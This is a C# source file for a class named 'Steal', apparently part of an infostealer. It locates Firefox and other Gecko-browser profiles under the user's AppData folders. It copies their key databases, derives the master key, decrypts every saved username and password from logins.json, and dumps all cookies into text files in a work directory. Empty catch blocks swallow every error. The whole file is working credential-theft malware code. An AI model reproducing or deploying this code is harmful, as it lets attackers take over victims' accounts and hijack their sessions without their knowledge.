using who.Gecko;
using NoiseMe.Drags.App.Data.SQLite;
using NoiseMe.Drags.App.Models.JSON;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using who.Helper;

namespace who.GeckoBrowsers
{
    class Steal
    {
        public static List<string> domains = new List<string>();
        public static List<string> Cookies_Gecko = new List<string>();
        public static List<string> passwors = new List<string>();
        public static List<string> credential = new List<string>();
        public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
        {
            List<string> list = new List<string>();
            if (files == null || files.Length == 0 || level > maxLevel)
            {
                return list;
            }
            try
            {
                string[] directories = Directory.GetDirectories(baseDirectory);
                foreach (string path in directories)
                {
                    try
                    {
                        DirectoryInfo directoryInfo = new DirectoryInfo(path);
                        FileInfo[] files2 = directoryInfo.GetFiles();
                        bool flag = false;
                        for (int j = 0; j < files2.Length; j++)
                        {
                            if (flag)
                            {
                                break;
                            }
                            for (int k = 0; k < files.Length; k++)
                            {
                                if (flag)
                                {
                                    break;
                                }
                                string a = files[k];
                                FileInfo fileInfo = files2[j];
                                if (a == fileInfo.Name)
                                {
                                    flag = true;
                                    list.Add(fileInfo.FullName);
                                }
                            }
                        }
                        foreach (string item in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
                        {
                            if (!list.Contains(item))
                            {
                                list.Add(item);
                            }
                        }
                        directoryInfo = null;
                    }
                    catch
                    {
                    }
                }
                return list;
            }
            catch
            {
                return list;
            }
        }
        public static readonly string LocalAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");
        public static readonly string TempDirectory = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");

        public static readonly string RoamingAppData = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");
        public static void Creds(string profile, string browser_name, string profile_name)
        {

            try
            {
                if (File.Exists(Path.Combine(profile, "key3.db")))
                {
                    Lopos(profile, p3k(CreateTempCopy(Path.Combine(profile, "key3.db"))), browser_name, profile_name);
                }

                Lopos(profile, p4k(CreateTempCopy(Path.Combine(profile, "key4.db"))), browser_name, profile_name);

            }
            catch (Exception)
            {

            }
        }

        public static void Cookies()
        {
            if (!Directory.Exists(Dirs.WorkDir + "\\Browsers"))
            {
                Directory.CreateDirectory(Dirs.WorkDir + "\\Browsers");
            }

            List<string> list2 = new List<string>();
            list2.AddRange(FindPaths(LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
            list2.AddRange(FindPaths(RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));

            foreach (string item in list2)
            {
                string fullName = new FileInfo(item).Directory.FullName;
                string text = item.Contains(RoamingAppData) ? prbn(fullName) : plbn(fullName);
                string profile_name = GetName(fullName);

                CookMhn(fullName, text, profile_name);

                string result = "";

                foreach (string a in Cookies_Gecko)
                {
                    result += a;

                 //   Console.WriteLine(result);
                }

                if (result != "")
                {
                    File.WriteAllText(Dirs.WorkDir + "\\Browsers\\Cookies_Gecko.txt", result, Encoding.Default);
                }

            }            
        }


        public static void Passwords()
        {
            if (!Directory.Exists(Dirs.WorkDir + "\\Browsers"))
                Directory.CreateDirectory(Dirs.WorkDir + "\\Browsers");

            List<string> list2 = new List<string>();
            list2.AddRange(FindPaths(LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
            list2.AddRange(FindPaths(RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
            foreach (string item in list2)
            {
                string fullName = new FileInfo(item).Directory.FullName;
                string text = item.Contains(RoamingAppData) ? prbn(fullName) : plbn(fullName);
                string profile_name = GetName(fullName);

                Creds(fullName, text, profile_name);

            }
          //  Console.ReadKey();
        }
        private static string GetName(string path)
        {
            try
            {
                string[] array = path.Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);

                return array[array.Length - 1];

            }
            catch
            {
            }
            return "Unknown";
        }
        public static readonly byte[] Key4MagicNumber = new byte[16]
           {
            248,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            1
           };
        public static string CreateTempCopy(string filePath)
        {
            string text = CreateTempPath();
            File.Copy(filePath, text, overwrite: true);
            return text;
        }

        public static string CreateTempPath()
        {
            return Path.Combine(TempDirectory, "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode() + Thread.CurrentThread.ManagedThreadId);
        }

        public static void CookMhn(string profile, string browser_name, string profile_name)
        {

            try
            {
                string text = Path.Combine(profile, "cookies.sqlite");

                CNT cNT = new CNT(CreateTempCopy(text));
                cNT.ReadTable("moz_cookies");
                for (int i = 0; i < cNT.RowLength; i++)
                {
                    try
                    {
                        domains.Add(cNT.ParseValue(i, "host").Trim());
                        Cookies_Gecko.Add(cNT.ParseValue(i, "host").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "path").Trim() + "\t" + (cNT.ParseValue(i, "isSecure") == "1") + "\t" + cNT.ParseValue(i, "expiry").Trim() + "\t" + cNT.ParseValue(i, "name").Trim() + "\t" + cNT.ParseValue(i, "value") + Environment.NewLine);
                        Func.Cookies.cookiesCount++;
                    }
                    catch
                    {
                    }

                }


            }
            catch (Exception)
            {

            }
        }

        public static void Lopos(string profile, byte[] privateKey, string browser_name, string profile_name)
        {
            try
            {
                string path = CreateTempCopy(Path.Combine(profile, "logins.json"));
                if (File.Exists(path))
                {
                    {
                        foreach (JsonValue item in (IEnumerable)File.ReadAllText(path).FromJSON()["logins"])
                        {
                            Func.Passwords.PassCounts++;
                            Gecko4 Gecko4 = Gecko1.Create(Convert.FromBase64String(item["encryptedUsername"].ToString(saving: false)));
                            Gecko4 Gecko42 = Gecko1.Create(Convert.FromBase64String(item["encryptedPassword"].ToString(saving: false)));
                            string text = Regex.Replace(Gecko6.lTRjlt(privateKey, Gecko4.Objects[0].Objects[1].Objects[1].ObjectData, Gecko4.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
                            string text2 = Regex.Replace(Gecko6.lTRjlt(privateKey, Gecko42.Objects[0].Objects[1].Objects[1].ObjectData, Gecko42.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);

                            string url = item["hostname"].ToString().Replace("\"", "").Replace("https://", "").Replace("http://", "").Replace("www.", "");

                            Func.Passwords.result += Environment.NewLine + "Host: " + url
                                + Environment.NewLine + "Login: " + text + Environment.NewLine+ "Password: " + text2 + Environment.NewLine +
                                "Soft: " + browser_name + Environment.NewLine;                          
                        } //                            

                    }
                }
            }
            catch 
            {
            }
        }

        private static byte[] p4k(string file)
        {
            byte[] result = new byte[24];
            try
            {
                if (!File.Exists(file))
                {
                    return result;
                }
                CNT cNT = new CNT(file);
                cNT.ReadTable("metaData");
                string s = cNT.ParseValue(0, "item1");
                string s2 = cNT.ParseValue(0, "item2)");
                Gecko4 Gecko4 = Gecko1.Create(Encoding.Default.GetBytes(s2));
                byte[] objectData = Gecko4.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
                byte[] objectData2 = Gecko4.Objects[0].Objects[1].ObjectData;
                Gecko8 Gecko8 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
                Gecko8.го7па();
                Gecko6.lTRjlt(Gecko8.DataKey, Gecko8.DataIV, objectData2);
                cNT.ReadTable("nssPrivate");
                int rowLength = cNT.RowLength;
                string s3 = string.Empty;
                for (int i = 0; i < rowLength; i++)
                {
                    if (cNT.ParseValue(i, "a102") == Encoding.Default.GetString(Key4MagicNumber))
                    {
                        s3 = cNT.ParseValue(i, "a11");
                        break;
                    }
                }
                Gecko4 Gecko42 = Gecko1.Create(Encoding.Default.GetBytes(s3));
                objectData = Gecko42.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
                objectData2 = Gecko42.Objects[0].Objects[1].ObjectData;
                Gecko8 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
                Gecko8.го7па();
                result = Encoding.Default.GetBytes(Gecko6.lTRjlt(Gecko8.DataKey, Gecko8.DataIV, objectData2, PaddingMode.PKCS7));
                return result;
            }
            catch (Exception)
            {
                return result;
            }
        } //Если P4Key

        private static byte[] p3k(string file)
        {
            byte[] array = new byte[24];
            try
            {
                if (!File.Exists(file))
                {
                    return array;
                }
                new DataTable();
                Gecko9 berkeleyDB = new Gecko9(file);
                Gecko7 Gecko7 = new Gecko7(vbv(berkeleyDB, (string x) => x.Equals("password-check")));
                string hexString = vbv(berkeleyDB, (string x) => x.Equals("global-salt"));
                Gecko8 Gecko8 = new Gecko8(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), ConvertHexStringToByteArray(Gecko7.EntrySalt));
                Gecko8.го7па();
                Gecko6.lTRjlt(Gecko8.DataKey, Gecko8.DataIV, ConvertHexStringToByteArray(Gecko7.Passwordcheck));
                Gecko4 Gecko4 = Gecko1.Create(ConvertHexStringToByteArray(vbv(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
                Gecko8 Gecko82 = new Gecko8(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), Gecko4.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
                Gecko82.го7па();
                Gecko4 Gecko42 = Gecko1.Create(Gecko1.Create(Encoding.Default.GetBytes(Gecko6.lTRjlt(Gecko82.DataKey, Gecko82.DataIV, Gecko4.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
                if (Gecko42.Objects[0].Objects[3].ObjectData.Length <= 24)
                {
                    array = Gecko42.Objects[0].Objects[3].ObjectData;
                    return array;
                }
                Array.Copy(Gecko42.Objects[0].Objects[3].ObjectData, Gecko42.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
                return array;
            }
            catch (Exception)
            {
                return array;
            }
        }//Если P3Key
        public static byte[] ConvertHexStringToByteArray(string hexString)
        {
            if (hexString.Length % 2 != 0)
            {
                throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", hexString));
            }
            byte[] array = new byte[hexString.Length / 2];
            for (int i = 0; i < array.Length; i++)
            {
                string s = hexString.Substring(i * 2, 2);
                array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
            }
            return array;
        }
        private static string vbv(Gecko9 berkeleyDB, Func<string, bool> predicate)
        {
            string text = string.Empty;
            try
            {
                foreach (KeyValuePair<string, string> key in berkeleyDB.Keys)
                {
                    if (predicate(key.Key))
                    {
                        text = key.Value;
                    }
                }
            }
            catch (Exception)
            {
            }
            return text.Replace("-", string.Empty);
        }

        private static string prbn(string profilesDirectory)
        {
            string text = string.Empty;
            try
            {
                string[] array = profilesDirectory.Split(new string[1]
                {
                    "AppData\\Roaming\\"
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
            }
            catch (Exception)
            {
            }
            return text.Replace(" ", string.Empty);
        }

        private static string plbn(string profilesDirectory)
        {
            string text = string.Empty;
            try
            {
                string[] array = profilesDirectory.Split(new string[1]
                {
                    "AppData\\Local\\"
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
            }
            catch (Exception)
            {
            }
            return text.Replace(" ", string.Empty);
        }
    }
}
